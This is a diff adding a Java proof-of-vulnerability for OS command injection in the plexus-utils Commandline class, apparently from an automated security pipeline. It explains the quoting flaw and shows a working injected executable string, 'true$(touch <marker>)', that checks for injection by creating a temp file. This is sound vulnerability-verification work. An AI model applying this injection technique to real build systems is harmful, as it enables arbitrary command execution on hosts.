@@ -1,0 +1,119 @@
+diff --git a/.security-pipeline/pov/CommandInjectionPov.java b/.security-pipeline/pov/CommandInjectionPov.java
+new file mode 100644
+index 0000000..1aaf808
+--- /dev/null
++++ b/.security-pipeline/pov/CommandInjectionPov.java
+@@ -0,0 +1,109 @@
++import org.codehaus.plexus.util.cli.Commandline;
++
++import java.io.File;
++
++/**
++ * Proof-of-vulnerability for CWE-078 (OS Command Injection) in
++ * org.codehaus.plexus.util.cli.Commandline / Shell / CmdShell.
++ *
++ * Root cause (primary path exercised by this POV):
++ *   Shell.getRawCommandLine() (src/main/java/org/codehaus/plexus/util/cli/shell/Shell.java:149)
++ *   quotes the "executable" via StringUtils.quoteAndEscape(...) using only a quote
++ *   character (getExecutableQuoteDelimiter()) with an empty/quote-only escape set
++ *   (Shell.java:147/149, BourneShell.getExecutable() -> unifyQuotes() ->
++ *   StringUtils.quoteAndEscape(path, '"', BASH_QUOTING_TRIGGER_CHARS) at
++ *   src/main/java/org/codehaus/plexus/util/cli/shell/BourneShell.java).
++ *   That routine only escapes literal quote characters -- it never neutralizes
++ *   shell metacharacters such as "$(", "`", ";", "|", etc. The quoted-but-not-escaped
++ *   executable string is concatenated into a single command string
++ *   (Shell.java:153/175) which Commandline.execute()
++ *   (src/main/java/org/codehaus/plexus/util/cli/Commandline.java:636 and :651,
++ *   both Runtime.exec(String[], String[]) / Runtime.exec(String[], String[], File)
++ *   overloads) hands to "/bin/sh -c <thatstring>" (BourneShell shellCommand).
++ *   Because the payload is wrapped in double quotes rather than single quotes,
++ *   POSIX command substitution ($(...) or backticks) still executes even though
++ *   the string is "quoted", so attacker-controlled data reaching
++ *   Commandline.setExecutable(...) (or the Shell/CmdShell constructors it calls
++ *   into) results in arbitrary command execution on the host running the build.
++ *
++ * Trust boundary: any caller (e.g. a Maven plugin, build script, or library
++ * consumer) that forwards a not-fully-trusted string (version string, tool name,
++ * user-configured path, etc.) into Commandline#setExecutable(String) / the
++ * Commandline(String) constructor crosses into this sink.
++ *
++ * Other sink/source paths reported by the alert that a complete fix must also
++ * cover (same shell-quoting root cause, different call sites):
++ *   - Shell.getRawCommandLine() quoting of *arguments* via
++ *     StringUtils.quoteAndEscape(arguments[i], ...) at Shell.java:167 (the
++ *     quoteAndEscape/quoting-trigger-chars path) and the unquoted-argument
++ *     fallback branch (Shell.java:171, isQuotedArgumentsEnabled()==false).
++ *   - CmdShell.getCommandLine(String executable, String[] arguments)
++ *     (src/main/java/org/codehaus/plexus/util/cli/shell/CmdShell.java:80-87),
++ *     which wraps the already-built (executable+arguments) string in a single
++ *     pair of double quotes for cmd.exe and is reachable through the same
++ *     Commandline.getShellCommandline() -> Runtime.exec(...) sinks
++ *     (Commandline.java:636 and :651, and the deprecated overload chain via
++ *     Commandline.java:501/506/622/674/700/702).
++ *   - Both Runtime.exec overloads used by Commandline.execute():
++ *       Commandline.java:636  Runtime.getRuntime().exec(getShellCommandline(), environment)
++ *       Commandline.java:651  Runtime.getRuntime().exec(getShellCommandline(), environment, workingDir)
++ *     Any fix must neutralize the executable/argument strings before either
++ *     call site, not just one.
++ *
++ * This POV targets the *executable* path (Shell.java:149 / BourneShell
++ * unifyQuotes) because it is the shortest, most direct route from
++ * Commandline.setExecutable(...) to Runtime.exec(...) shared by both exec()
++ * overloads, and because it requires no special argument-escaping bypass -- a
++ * bare "$(...)" in the executable name is sufficient, demonstrating the root
++ * cause cleanly.
++ */
++public class CommandInjectionPov
++{
++    public static void main( String[] args )
++        throws Exception
++    {
++        File marker = File.createTempFile( "plexus_pov_marker", ".txt" );
++        String markerPath = marker.getAbsolutePath();
++        // Ensure the marker does not exist yet -- its creation is our injection oracle.
++        marker.delete();
++
++        // Simulates untrusted input (e.g. a user/config-supplied tool name or
++        // version fragment) flowing into Commandline#setExecutable(String).
++        String attackerControlledExecutable = "true$(touch " + markerPath + ")";
++
++        Commandline cmd = new Commandline();
++        cmd.setExecutable( attackerControlledExecutable );
++
++        System.out.println( "Shell command line: " + java.util.Arrays.toString( cmd.getShellCommandline() ) );
++
++        try
++        {
++            Process p = cmd.execute();
++            p.waitFor();
++        }
++        catch ( Exception e )
++        {
++            // Expected in many cases: the mangled "executable" (e.g. "true ")
++            // is not found as a real program once the command substitution's
++            // (empty) output is spliced in. That failure is irrelevant --
++            // the injected side effect (creating the marker file) already
++            // happened inside the shell before the exec failure.
++            System.out.println( "execute() raised: " + e );
++        }
++
++        // Give the child process a brief moment to finish writing the marker.
++        Thread.sleep( 300 );
++
++        if ( marker.exists() )
++        {
++            System.out.println( "VULNERABLE: injected shell command executed; marker created at " + markerPath );
++            marker.delete();
++            System.exit( 0 );
++        }
++        else
++        {
++            System.out.println( "NOT VULNERABLE: injected shell command did not execute" );
++            System.exit( 1 );
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/classes/CommandInjectionPov.class b/.security-pipeline/pov/classes/CommandInjectionPov.class
+new file mode 100644
+index 0000000..4a27b2a
+Binary files /dev/null and b/.security-pipeline/pov/classes/CommandInjectionPov.class differ
